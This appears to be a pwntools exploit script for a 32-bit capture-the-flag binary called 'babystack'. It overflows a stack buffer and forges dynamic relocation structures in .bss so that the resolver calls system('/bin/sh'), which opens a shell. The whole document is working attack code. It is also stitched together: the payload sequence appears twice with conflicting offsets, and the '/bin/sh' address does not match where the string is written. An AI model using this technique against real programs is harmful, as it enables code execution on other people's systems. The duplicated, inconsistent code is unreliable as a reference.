from pwn import *

context.arch = "i386"
context.binary = "./babystack"
elf = ELF("./babystack")
target = process("./babystack")

# readelf -S babystack
#  [ 5] .dynsym           DYNSYM          080481cc 0001cc 000060 10   A  6   1  4
#  [ 6] .dynstr           STRTAB          0804822c 00022c 000050 00   A  0   0  1
#  [12] .plt              PROGBITS        080482f0 0002f0 000040 04  AX  0   0 16
#  [10] .rel.plt          REL             080482b0 0002b0 000018 08  AI  5  24  4
#  [26] .bss              NOBITS          0804a020 001020 000004 00  WA  0   0  1
# -----
# ssize_t sub_804843B(){
#  _BYTE buf[40]; // [esp+0h] [ebp-28h] BYREF
#  return read(0, buf, 0x40u);}

bss     = 0x804A020
dynstr  = 0x804822C
dynsym  = 0x80481CC
relplt  = 0x80482B0
plt0    = 0x80482F0
read_func = 0x804843B

padding = b"0" * (40 + 4)
payload0_size = 44


payload0 = flat(
    padding,
    elf.symbols["read"],
    read_func,
    0,
    bss,
    payload0_size,
)

target.send(payload0)

dynsym_offset = ((bss + 0x08) - dynsym) // 0x10
r_info = (dynsym_offset << 8) | 0x7
dynstr_index = (bss + 0x18) - dynstr

payload1 = flat(
    elf.got["alarm"],
    r_info,
    dynstr_index,
    0,
    0,
    b"system\x00",
    b"/bin/sh\x00"
)

target.send(payload1)

ret_plt_offset = bss - relplt
binsh_bss_address = bss + 100 

payload2 = flat(
    padding,
    plt0,
    ret_plt_offset,
    0,
    binsh_bss_address,
)

target.send(payload2)

log.success("Elf32 dynamic relocation structures hijacked successfully! Shell popped.")
target.interactive()
bss = 0x804A020
dynstr = 0x804822C
dynsym = 0x80481CC
relplt = 0x80482B0
plt0 = 0x80482F0
read_func = 0x804843B

padding = b"0" * (40 + 4)
payload0_size = 44

payload0 = flat(
    padding,
    elf.symbols["read"],
    read_func,
    0,
    bss,
    payload0_size,
)
target.send(payload0)

dynsym_offset = ((bss + 0xC) - dynsym) // 0x10
r_info = (dynsym_offset << 8) | 0x7
dynstr_index = (bss + 65) - dynstr

payload1 = flat(
    elf.got["alarm"], r_info, 0, dynstr_index, 0, b"system\x00", b"/bin/sh\x00"
)

target.send(payload1)

binsh_bss_address = bss + 100
ret_plt_offset = bss - relplt

payload2 = flat(
    padding,
    plt0,
    ret_plt_offset,
    0,
    binsh_bss_address,
)

target.send(payload2)
log.success("Elf32 dynamic relocation structures hijacked successfully! Shell popped.")
target.interactive()
